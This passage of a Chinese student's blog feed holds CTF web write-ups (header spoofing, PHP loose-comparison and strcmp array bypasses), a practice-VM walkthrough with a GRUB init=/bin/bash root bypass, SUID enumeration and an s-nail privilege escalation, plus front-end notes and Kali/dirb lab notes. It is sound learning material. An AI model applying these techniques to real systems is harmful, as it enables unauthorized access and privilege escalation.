        <content type="html"><![CDATA[<h1 id="CTF实战相关2"><a href="#CTF实战相关2" class="headerlink" title="CTF实战相关2"></a>CTF实战相关2</h1><p>以web类的CTF作为范本的话<br>应该做的</p><blockquote><p>1.检查网页元素 寻找相关提示<br>2.通过网络查看http标头(header)<br>3.burp扫描&#x2F;hackbar投送信息&#x2F;更改cookie<br>4.php相关知识</p></blockquote><p>还有标头会传达的 可更改的两个信息 X-Forwarded-For 与 Referer<br>简单来说<br>X-Forwarded-For表示访问该网址的ip 例如127.0.0.1即为本地访问<br>Referer代表了你是从哪个网页来——例如<code>http://www.google.com</code></p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>（注：这里图片只附上结果 主要是不想再开环境了）<br>使用了谷歌浏览器的f12功能 burpsuite 与 firefox的hackbar插件</p><h4 id="1-BugKu-Web-计算器"><a href="#1-BugKu-Web-计算器" class="headerlink" title="1.BugKu-Web-计算器"></a>1.BugKu-Web-计算器</h4><p>检查html元素 发现页面中的答题框只允许输一个数字 无法正确回答<br>更改input框中限制的文字上限 成功作答 获得flag<br><img src="1.jpg" alt="1"></p><h4 id="2-攻防世界-Web新手区-disabled-button"><a href="#2-攻防世界-Web新手区-disabled-button" class="headerlink" title="2.攻防世界-Web新手区- disabled_button"></a>2.攻防世界-Web新手区- disabled_button</h4><p>检查html元素 发现页面中显示“一个不能按的按钮” 多半按下后才能显示flag<br>删去按钮属性框中的<code>disabled</code> 按下按钮 获得flag<br><img src="2.jpg" alt="2"></p><h4 id="3-BugKu-Web-头等舱"><a href="#3-BugKu-Web-头等舱" class="headerlink" title="3.BugKu-Web-头等舱"></a>3.BugKu-Web-头等舱</h4><p>检查页面 f12发现无标注隐藏元素 根据题目名“头等舱” 通过f12-网络<br>f5刷新后从网络标头中找到flag<br><img src="3.jpg" alt="3"></p><h4 id="4-攻防世界-Web-baby-web"><a href="#4-攻防世界-Web-baby-web" class="headerlink" title="4.攻防世界-Web-baby_web"></a>4.攻防世界-Web-baby_web</h4><p>检查页面 发现无隐藏元素 根据作者提示<code>想想主页面是什么</code>访问目录index.php<br>然而index.php也无任何隐藏<br>最终 通过f12-网络 f5刷新后从该页面的网络标头中找到flag<br><img src="4.jpg" alt="4"></p><h4 id="5-（BUUCTF）极客大挑战-2019-Havefun"><a href="#5-（BUUCTF）极客大挑战-2019-Havefun" class="headerlink" title="5.（BUUCTF）极客大挑战-2019-Havefun"></a>5.（BUUCTF）极客大挑战-2019-Havefun</h4><p>检查页面 元素中有标注代码 该页面GET方式接收cat参数<br>当cat&#x3D;dog时会发生什么 于是传参 获得flag<br><img src="5.jpg" alt="5"></p><h4 id="6-攻防世界-Web新手区-get-post"><a href="#6-攻防世界-Web新手区-get-post" class="headerlink" title="6.攻防世界-Web新手区-get_post"></a>6.攻防世界-Web新手区-get_post</h4><p>检查页面 要求你通过GET方式提交a&#x3D;1<br>提交后又叫你通过POST方式提交b&#x3D;2<br>照做即可 获得flag<br><img src="6.jpg" alt="6"></p><h4 id="7-BugKu-Web-程序员本地网站"><a href="#7-BugKu-Web-程序员本地网站" class="headerlink" title="7.BugKu-Web-程序员本地网站"></a>7.BugKu-Web-程序员本地网站</h4><p>检查页面 页面显示<code>请以本地ip访问</code><br>使用burpsuite监听该网页 并将X-Forwarded-For标头改为127.0.0.1<br>获得flag<br><img src="7.jpg" alt="7"></p><h4 id="8-BugKu-Web-你从哪里来"><a href="#8-BugKu-Web-你从哪里来" class="headerlink" title="8.BugKu-Web-你从哪里来"></a>8.BugKu-Web-你从哪里来</h4><p>检查页面 页面显示<code>are you from google？</code><br>判定与referer标头有关 通过burpsuite监听页面<br>将referer标头改为<code>http://www.google.com</code><br>获得flag<br><img src="8.jpg" alt="8"></p><h4 id="9-攻防世界-Web新手区-xff-referrer"><a href="#9-攻防世界-Web新手区-xff-referrer" class="headerlink" title="9.攻防世界-Web新手区-xff_referrer"></a>9.攻防世界-Web新手区-xff_referrer</h4><p>检查页面 页面显示<code>ip必须为123.123.123</code><br>使用burpsuite监听该网页 并将X-Forwarded-For标头改为123.123.123.123<br>页面变为“必须来自<code>https://www.google.com</code>”<br>通过burpsuite监听页面 将referer标头改为<code>http://www.google.com</code><br>获得flag<br><img src="9.jpg" alt="9"></p><h4 id="10-攻防世界-Web新手区-cookie"><a href="#10-攻防世界-Web新手区-cookie" class="headerlink" title="10.攻防世界-Web新手区-cookie"></a>10.攻防世界-Web新手区-cookie</h4><p>检查页面 页面显示“你知道什么是cookie吗？”<br>f12-网络 查看页面cookie 发现信息<code>look here=cookie.php</code><br>于是访问cookie.php 发现信息 <strong>see the http response</strong><br>查看标头 获得flag<br><img src="10.jpg" alt="10"></p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>靶机解析-gigachad</title>
      <link href="/2024/03/09/%E9%9D%B6%E6%9C%BA%E8%A7%A3%E6%9E%90-gigachad/"/>
      <url>/2024/03/09/%E9%9D%B6%E6%9C%BA%E8%A7%A3%E6%9E%90-gigachad/</url>
      
        <content type="html"><![CDATA[<p>这周的靶机</p><h1 id="环境设置"><a href="#环境设置" class="headerlink" title="环境设置"></a>环境设置</h1><p>攻击机：kali<br>靶机：gigachad</p><h2 id="相关知识-工具"><a href="#相关知识-工具" class="headerlink" title="相关知识-工具"></a>相关知识-工具</h2><p>linux单次登录&#x2F;更改ip设置<br>提权技巧<br>searchsploit</p><h1 id="具体过程"><a href="#具体过程" class="headerlink" title="具体过程"></a>具体过程</h1><p>首先 我们打开两个机子</p><p>发现同网段扫不到靶机 检查了vmware的设置依旧没有问题<br>那就去靶机那里看看网络设置<br>需要账号密码登录 但我们可以通过更改启动选项来登录<br><img src="2.jpg" alt="1"><br>在开机的这个页面按下e键 进入编辑模式<br>用方向键翻到Linux那行 再按右键一直到该行的末尾 将<code>ro quiet</code>改为<code>rw single init=/bin/bash</code></p><blockquote><p>rw 代表read write，读写模式。<br>signie init&#x3D; 代表启动系统后自动运行的程序。<br>&#x2F;bin&#x2F;bash 是系统shell的位置。</p></blockquote><p><img src="1.jpg" alt="1"><br>更改完毕后按下ctrl+x来保存 随后你会发现你成功登陆了 按enter来在加载时提前输入命令<br>在linux内挑出了shell后 为了排查扫不到的原因 先执行<code>ip a</code>检查一下<br><img src="3.jpg" alt="3"><br>看来是网卡<code>ens33</code>没有自动分配到ip地址<br>看一下网络的配置 发现配置的网卡名是<code>enp0s3</code> 明显不对 将它改回<code>ens33</code><br><img src="4.jpg" alt="4"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/network/interfaces //查看文件内容</span><br><span class="line">vi /etc/network/interfaces //编辑文件内容</span><br><span class="line">/etc/init.d/networking restart //重启网络</span><br></pre></td></tr></table></figure><p>改完之后重启网络 通过<code>ip a</code>确认靶机已经联网<br><img src="5.jpg" alt="5"><br><img src="6.jpg" alt="6"><br>这里就可以看到靶机分到的ip了<br>重启靶机后直接在kali进行指定的nmap扫描<br><code>nmap -A -p- &#39;ip地址&#39; //-A指综合性扫描</code><br><img src="7.jpg" alt="7"><br>http&#x2F;80端口开着 ftp&#x2F;21端口也开着 允许匿名登录 还有个叫chadinfo的文件<br>先从tcp入手<br><img src="8.jpg" alt="8"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ftp &#x27;ip地址&#x27; //尝试链接ftp服务</span><br><span class="line">ls</span><br><span class="line">get &#x27;文件名&#x27; //下载文件</span><br></pre></td></tr></table></figure><p>获取了叫chadinfo的文件<br><img src="9.jpg" alt="9"><br>解压之后有个txt文件<br>里边说用户名是 <strong>chad</strong> 密码请去&#x2F;drippinchad.png里找<br>访问网站底下的这个目录<br><img src="10.jpg" alt="10"><br>why yes,this is my favorite place to relax.how could you tell?<br>这个地的地名似乎就是密码 以图搜图一下<br><img src="11.jpg" alt="11"><br>结论：叫做maiden‘s tower<br>尝试用chad与maiden’s tower的各种形式来登录ssh服务<br><img src="12.jpg" alt="12"><br>用<code>maidenstower</code>成功登录<br><img src="13.jpg" alt="13"><br>目录底下就有flag1<br>flag2多半是需要提权了</p><blockquote><p>拿到低权限的shell后经常做的几件事：<br>1、看系统发行版本 lsb_release -a<br>2、查看内核版本 uname -a<br>3、当前用户权限<br>4、列举suid文件 &#96;find &#x2F; -perm -u&#x3D;f 2&gt;&#x2F;dev&#x2F;null<br>5、查看已经安装的包、运行的服务，过期版本可能会存在漏洞</p><p>find &#x2F; -perm -u&#x3D;s -type f -exec ls -la {} ; 2&gt;&#x2F;dev&#x2F;null<br>-perm 是代表按指定权限搜索。<br>-u&#x3D;s 其中u代表当前用户的权限，s代表suid权限，-号代表至少需要满足指定的权限，可以有更多的权限，但是不能少了这个指定权限。关于这个参数更详细的内容可以参考：<a href="https://blog.csdn.net/weixin_44061169/article/details/105784760">https://blog.csdn.net/weixin_44061169/article/details/105784760</a><br>-tpye 代表搜索指定的类型，f代表文件。<br>-exec 代表搜索完后执行指定的命令，其中{}代表所搜到的结果，命令以;为结束标识。更详细内容可以参考：<a href="https://www.pianshen.com/article/86691137271/">https://www.pianshen.com/article/86691137271/</a><br>2&gt;&#x2F;dev&#x2F;null 代表将不显示错误信息</p><p>参考：<a href="https://blog.csdn.net/rpsate/article/details/119494515">https://blog.csdn.net/rpsate/article/details/119494515</a></p></blockquote><p><img src="14.jpg" alt="14"><br>发现s-nail，尝试利用该程序提权<br><img src="15.jpg" alt="15"><br>寻找漏洞<br><img src="16.jpg" alt="16"><br>将提权文件复制进靶机<br><img src="17.jpg" alt="17"><br><img src="18.jpg" alt="18"><br>加权 运行 要多试几次 最后成功提权<br><img src="19.jpg" alt="19"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>最近有点忙着备考就不写总结了<br>嘻嘻</p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
          <category> 靶机解析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> 靶机解析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctf实战相关1</title>
      <link href="/2024/03/06/ctf%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B31/"/>
      <url>/2024/03/06/ctf%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B31/</url>
      
        <content type="html"><![CDATA[<p>本次主题为 <strong>[ACTF2020 新生赛]BackupFile</strong> 与 <strong>[极客大挑战 2019]BuyFlag</strong></p><h2 id="使用平台"><a href="#使用平台" class="headerlink" title="使用平台"></a>使用平台</h2><p>chrome<br><a href="https://buuoj.cn/">buuctf</a><br>firefox(搭载hackbar)</p><h2 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h2><p>备份文件的存在<br>cookie查看&#x2F;修改<br>php数据类型</p><h2 id="flag获取过程"><a href="#flag获取过程" class="headerlink" title="flag获取过程"></a>flag获取过程</h2><p><strong>1.[ACTF2020 新生赛]BackupFile</strong><br><img src="1.jpg" alt="1"><br>总之 一进去 啥都没有<br>f12注释也没藏<br>我们换个思路 既然题目内容点了题 那么解题方案注定和backup file有关<br>多半只能扫目录了 于是用dirsearch和dirb搜索相关的目录<br>最后发现是潜藏在主页的.bak(每个页面都会有的备份页面)之中<br><img src="2.png" alt="2"><br>👆关于.bak文件的相关解释<br>目录后输入<code>/index.php.bak</code> 会为你自动下载一份文件 以记事本打开<br><img src="3.jpg" alt="3"><br>要我通过输入非纯数字的方式提交$str的内容在PHP中：<br>&#x3D; &#x3D; 为弱相等 即当整数和字符串类型相比较时 会先将字符串转化为整数然后再进行比较。比如a&#x3D;123和b&#x3D;123a45进行&#x3D; &#x3D;比较时。b只会截取前面的整数部分 被转化成123 因此只需要提供参数?key&#x3D;123即可<br><img src="4.jpg" alt="4"><br>提交flag 结束!</p><p><strong>2.[极客大挑战 2019]BuyFlag</strong><br><img src="5.jpg" alt="5"><br>首先观察主页面 发现右侧菜单栏通往另一个与flag有关的分页面<br><img src="6.jpg" alt="6"><br>首先是线索<br>(如果想要购买flag 你必须得是CUIT的学生之一 还得回答正确的密码)<br>第一关是 <strong>通过CUIT的学生验证</strong><br>我们通过观察网站的网络数据包与cookie 发现一个名为 <strong>user</strong> 的cookie 值为0<br>尝试将0更改为1 成功通过<br><img src="7.jpg" alt="7"><br>第二关是 <strong>输入正确密码</strong><br><img src="8.jpg" alt="8"><br>这点网站的注释中有相关的代码透露<br>该代码内同样使用了 <strong>弱相等</strong> 需要通过post方式将 <strong>$password</strong> 改为会被整数化为404的字符 我们拟用 <strong>404a</strong> 进行尝试 成功通过<br><img src="9.jpg" alt="9"><br>进入了第三关 <strong>付钱</strong><br>注释中提到过 <strong>post money and password</strong><br>因此投送的数据名应为money<br><img src="10.jpg" alt="10"><br>输入了所需要的100000000元后 却显示数据过长 需要压缩<br>这里有两种方式<br>(1)输入简略的科学计数法 如1e9&#x3D;1×10的9次方 来使字符压缩<br>(2)利用strcmp函数在判断对象不是字符串时会报错并return0 的特性<br>输入money[]&#x3D;1 使money变为数组 获取flag<br><img src="11.jpg" alt="11"><br>提交flag 结束!</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>更感觉CTF是一种不同形式的靶机<br>总之我们下次见吧</p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>复习time</title>
      <link href="/2024/02/27/%E5%A4%8D%E4%B9%A0time/"/>
      <url>/2024/02/27/%E5%A4%8D%E4%B9%A0time/</url>
      
        <content type="html"><![CDATA[<h1 id="高三了进行一个前端（html-css-javascript）的复习"><a href="#高三了进行一个前端（html-css-javascript）的复习" class="headerlink" title="高三了进行一个前端（html+css+javascript）的复习"></a>高三了进行一个前端（html+css+javascript）的复习</h1><h2 id="html"><a href="#html" class="headerlink" title="html"></a>html</h2><blockquote><p>“超文本标记语言（英语：HyperText Markup Language，简称：HTML）是一种用于创建网页的标准标记语言。<br>您可以使用 HTML 来建立自己的 WEB 站点，HTML 运行在浏览器上，由浏览器来解析。”</p></blockquote><p><strong>基础构造</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>元素名用尖括号包裹<br>以<code>&lt;元素名&gt;元素内容&lt;/元素名&gt;</code>或<code>&lt;元素名 /&gt;</code>作为一部分组成的代码<br>注释形式为<code>&lt;!--这是一个注释，注释在浏览器中不会显示--&gt;</code></p><h2 id="css"><a href="#css" class="headerlink" title="css"></a>css</h2><blockquote><p>“<strong>CSS</strong> (Cascading Style Sheets，层叠样式表），是一种用来为结构化文档（如 HTML 文档或 XML 应用）添加样式（字体、间距和颜色等）的计算机语言，<strong>CSS</strong> 文件扩展名为 <strong>.css</strong>。<br>通过使用 <strong>CSS</strong> 我们可以大大提升网页开发的工作效率！”</p></blockquote><p><strong>基础构造</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line"><span class="attribute">background-color</span>:<span class="number">#d0e4fe</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">h1</span> &#123;</span><br><span class="line"><span class="attribute">color</span>:orange;</span><br><span class="line"><span class="attribute">text-align</span>:center;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">p</span> &#123;</span><br><span class="line"><span class="attribute">font-family</span>:<span class="string">&quot;Times New Roman&quot;</span>;</span><br><span class="line"><span class="attribute">font-size</span>:<span class="number">20px</span>;</span><br><span class="line">&#125;</span><br><span class="line">👆在<span class="selector-tag">html</span>中直接编译可以使用&lt;style&gt;标签</span><br><span class="line">又或者使用 &lt;link rel=&quot;stylesheet&quot; href=&quot;style<span class="selector-class">.css</span>&quot;&gt;</span><br><span class="line">这样便可以多个网页复用一个css文件</span><br></pre></td></tr></table></figure><p>首先声明需要更改的元素 （例如body）<br>然后用大括号 里面加上属性 随后加冒号 声明属性的值 随后以分号收尾<br>除了直接更改元素 还可以使用选择器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#para1</span><br><span class="line">&#123;</span><br><span class="line">text-align:center;</span><br><span class="line">color:red;</span><br><span class="line">&#125;</span><br><span class="line">👆CSS 中id 选择器以 &quot;#&quot; 来定义</span><br><span class="line">&lt;p id=&quot;para1&quot;&gt;Hello World!&lt;/p&gt;</span><br><span class="line">👆这个段落就会受到居中和红色字体的影响</span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.center</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="attribute">text-align</span>:center;</span><br><span class="line">&#125;</span><br><span class="line">👆在 CSS 中类选择器以一个点.号显示</span><br><span class="line">&lt;<span class="selector-tag">h1</span> class=&quot;center&quot;&gt;标题居中&lt;/<span class="selector-tag">h1</span>&gt;</span><br><span class="line">&lt;<span class="selector-tag">p</span> class=&quot;center&quot;&gt;段落居中。&lt;/<span class="selector-tag">p</span>&gt;</span><br><span class="line">👆这些元素就会受到居中影响</span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">p</span><span class="selector-class">.center</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="attribute">text-align</span>:center;</span><br><span class="line">&#125;</span><br><span class="line">👆在.号前加上元素名 就能限制选择器的范围</span><br><span class="line">&lt;<span class="selector-tag">h1</span> class=&quot;center&quot;&gt;这个标题不受影响&lt;/<span class="selector-tag">h1</span>&gt;</span><br><span class="line">&lt;<span class="selector-tag">p</span> class=&quot;center&quot;&gt;这个段落居中对齐。&lt;/<span class="selector-tag">p</span>&gt;</span><br></pre></td></tr></table></figure><p>注释方式是<code>/*这里是注释的内容*/</code></p><h2 id="javascript"><a href="#javascript" class="headerlink" title="javascript"></a>javascript</h2><p>还在自学 打点草稿上来 1.javascript对大小写敏感<br>2.输出方式很多<br>(1)浏览器的f12 - 控制台中测试<br>(2)html文件<code>&lt;script&gt;</code>元素之间</p><p>总之先把现在懂的代码列出来吧<br>(1)var 变量名&#x3D;’变量内容’ &#x2F;&#x2F;定义变量<br>(2)字符需要加“”或者’‘ 不然被看做变量<br>(3)console.log(“这些文字”) &#x2F;&#x2F;让该网页的控制台中输出这些文字<br>(4)<code>单行注释 //</code><br>(5)<code>/*多行注释*/</code><br>(6)申明函数（类似于python）<br>function 函数名称（可选的变量项1，变量项2）{<br>代码内容<br>}<br>(7) return x; 输出变量x的值 多用于函数结尾<br>(8) 加在元素的标签内 例如下文中的onclick 点击后通过替换demo中的内容来实现报时<br><code>&lt;button onclick=&quot;getElementById(&#39;demo&#39;).innerHTML=Date()&quot;&gt;现在的时间是?&lt;/button&gt;</code><br><code>&lt;p id=&quot;demo&quot;&gt;&lt;/p&gt;</code><br><a href="https://www.runoob.com/jsref/dom-obj-event.html">https://www.runoob.com/jsref/dom-obj-event.html</a><br>至于事件可以看这里👆</p><p>(9)至于元素和.后边的相互关系目前未知<br>(10)输出方式很多<br>使用document.write()将内容写入到html中<br>使用console.log()在f12里的console生成信息<br>使用window.alert()弹出警告框<br>用id属性标识某个元素 然后使用document.getElementById(“demo”).innerHTML&#x3D;”想要加入的内容”<br><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Element/innerHTML">https://developer.mozilla.org/zh-CN/docs/Web/API/Element/innerHTML</a><br>很酷<br>vue.js<br>(11)变量在赋值之前都是undefined</p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>开学季</title>
      <link href="/2024/02/25/%E5%BC%80%E5%AD%A6%E5%AD%A3/"/>
      <url>/2024/02/25/%E5%BC%80%E5%AD%A6%E5%AD%A3/</url>
      
        <content type="html"><![CDATA[<p>开学了<br>离大考只剩两 三个月了<br>照常会把课程内容记录下来</p>]]></content>
      
      
      <categories>
          
          <category> 日常牢骚 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日常牢骚 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>维修时间</title>
      <link href="/2024/01/28/%E2%80%9C%E7%BB%B4%E4%BF%AE%E6%97%B6%E9%97%B4%E2%80%9D/"/>
      <url>/2024/01/28/%E2%80%9C%E7%BB%B4%E4%BF%AE%E6%97%B6%E9%97%B4%E2%80%9D/</url>
      
        <content type="html"><![CDATA[<h1 id="前情提要"><a href="#前情提要" class="headerlink" title="前情提要"></a><strong>前情提要</strong></h1><p>网络不知道为啥寄了<br>speedtest变成了随机数生成器 5mb 200mb 400mb里上下蹦跳<br>首先怀疑的是<strong>墙内内嵌的网线老化导致网速不行</strong><br>然后拿了一根<strong>40m长</strong>的网线直连了<br>结果还是不行<br>dns也没毛病<br>结果是<strong>msi center</strong>限制了我的网速<br><a href="https://blog.csdn.net/qq_37296622/article/details/123959244#">相同的案例</a><br>教训是 少下捆绑 硬件相关的软件 尤其是在更新时注意是否有“新功能”</p>]]></content>
      
      
      <categories>
          
          <category> 日常牢骚 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日常牢骚 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小小修整</title>
      <link href="/2024/01/15/%E5%B0%8F%E5%B0%8F%E4%BF%AE%E6%95%B4/"/>
      <url>/2024/01/15/%E5%B0%8F%E5%B0%8F%E4%BF%AE%E6%95%B4/</url>
      
        <content type="html"><![CDATA[<h1 id="首先是-新年快乐"><a href="#首先是-新年快乐" class="headerlink" title="首先是 新年快乐"></a>首先是 新年快乐</h1><p>这几天去南京旅游了 主要是为了放松<br>因此没更新<br>现在回来了<br>接下来要干的事：<br><strong>把笔记本改造成自己的便捷平台<br>通过按照月份分类来整理有些过多的文章<br>作业 看书 多学 老生常谈</strong></p>]]></content>
      
      
      <categories>
          
          <category> 日常牢骚 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 告示 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学校实训-笔记</title>
      <link href="/2024/01/08/%E5%AD%A6%E6%A0%A1%E5%AE%9E%E8%AE%AD-%E7%AC%94%E8%AE%B0/"/>
      <url>/2024/01/08/%E5%AD%A6%E6%A0%A1%E5%AE%9E%E8%AE%AD-%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>学校寒假放了点作业出来<br>做个笔记</p><h1 id="实验-1-配置Kali"><a href="#实验-1-配置Kali" class="headerlink" title="实验 1 配置Kali"></a>实验 1 配置Kali</h1><p><strong>实验场景</strong><br>小明是网络工程师，某天他收到上级领导命令，需要在网络中部署一台Kali服务器，为…</p><p><strong>实验环境</strong><br>Kali 2016</p><p><strong>实验工具</strong><br>无</p><p><strong>实验目的</strong><br>对Kali进行网络配置，修改主机名和root密码，修改源配置文件并进行系统更新</p><h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><h3 id="1-修改主机名"><a href="#1-修改主机名" class="headerlink" title="1. 修改主机名"></a>1. 修改主机名</h3><ul><li>临时修改主机名，重启会还原</li><li>永久修改主机名，需要重启才能生效</li><li>修改 <code>/etc/hosts</code> 配置文件</li></ul><h3 id="2-配置Kali的网络"><a href="#2-配置Kali的网络" class="headerlink" title="2. 配置Kali的网络"></a>2. 配置Kali的网络</h3><ul><li>修改本机的网卡设置，设置为dhcp获取IP方式，也可以设置成静态IP，需要给网卡配置IP地址<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/network/interfaces</span><br></pre></td></tr></table></figure></li></ul><h3 id="3-查看当前用户是否是root，修改root密码"><a href="#3-查看当前用户是否是root，修改root密码" class="headerlink" title="3. 查看当前用户是否是root，修改root密码"></a>3. 查看当前用户是否是root，修改root密码</h3><h3 id="4-修改Kali的源配置文件，添加国内的源，并进行系统升级"><a href="#4-修改Kali的源配置文件，添加国内的源，并进行系统升级" class="headerlink" title="4. 修改Kali的源配置文件，添加国内的源，并进行系统升级"></a>4. 修改Kali的源配置文件，添加国内的源，并进行系统升级</h3><ul><li>添加中科大的源<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/apt/sources.list</span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure></li><li>执行更新指令<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get update &amp;&amp; apt-get upgrade &amp;&amp; apt-get dist-upgrade</span><br></pre></td></tr></table></figure>等待更新完成</li></ul><p><strong>实验总结</strong><br>Kali版本众多，最新版本中会添加一些最新的工具和软件，需要持续进行更新。</p><h1 id="实验-2-Web应用程序-Dirb"><a href="#实验-2-Web应用程序-Dirb" class="headerlink" title="实验 2 Web应用程序-Dirb"></a>实验 2 Web应用程序-Dirb</h1><p><strong>实验场景</strong><br>小明是网络工程师，某天他收到上级领导命令，需要在Kali服务器使用Dirb软件，为…</p><p><strong>实验环境</strong><br>攻击机Kali 2018<br>靶机Windows 7 192.168.163.</p><p><strong>实验工具</strong><br>Dirb</p><p><strong>实验目的</strong><br>了解并掌握Dirb对网站进行扫描</p><h2 id="实验步骤-1"><a href="#实验步骤-1" class="headerlink" title="实验步骤"></a>实验步骤</h2><p>DIRB是一个Web内容扫描。它看起来对现有（和&#x2F;或隐藏）的Web对象。它主要的工作原理是发动了对Web服务器的基于字典的攻击和分析的响应。</p><p>DIRB带有易于使用的一组预配置的攻击生词，但你可以用你自定义的词表。此外DIRB有时可以作为一个典型的CGI扫描器，但要记住是一个内容扫描仪没有漏洞扫描器。</p><p>DIRB主要目的是在专业的Web应用程序的审核帮助。特别是在与安全相关的测试。它没有涵盖的经典网页漏洞扫描器一些漏洞。 DIRB寻找其他通用CGI扫描器无法查找特定的Web对象。它不搜索的漏洞，也没有寻找网页内容，可以vulnerables。</p><p>直接在终端启动软件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb</span><br></pre></td></tr></table></figure><p>扫描Web服务器（<a href="http://192.168.163.147:88/%EF%BC%89%E5%88%A9%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%87%AA%E5%B8%A6%E5%AD%97%E5%85%B8%E6%96%87%E4%BB%B6">http://192.168.163.147:88/）利用系统自带字典文件</a><br>（&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;common.txt）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.163.147:88/ /usr/share/wordlists/dirb/common.txt</span><br></pre></td></tr></table></figure><p>使用自备字典进行扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.163.147:88 /root/test.txt</span><br></pre></td></tr></table></figure><p><strong>实验总结</strong><br>掌握使用Dirb对Web进行扫描，查看软件的扫描报告文件</p><h1 id="实验-3-报告工具-pipal"><a href="#实验-3-报告工具-pipal" class="headerlink" title="实验 3 报告工具-pipal"></a>实验 3 报告工具-pipal</h1><p><strong>实验场景</strong><br>小明是网络工程师，某天他收到上级领导命令，需要在Kali服务器使用pipal工具，为…</p><p><strong>实验环境</strong><br>Kali 2018</p><p><strong>实验工具</strong><br>Pipal</p><p><strong>实验目的</strong><br>掌握密码分析工具pipal的使用方法</p><h2 id="实验步骤-2"><a href="#实验步骤-2" class="headerlink" 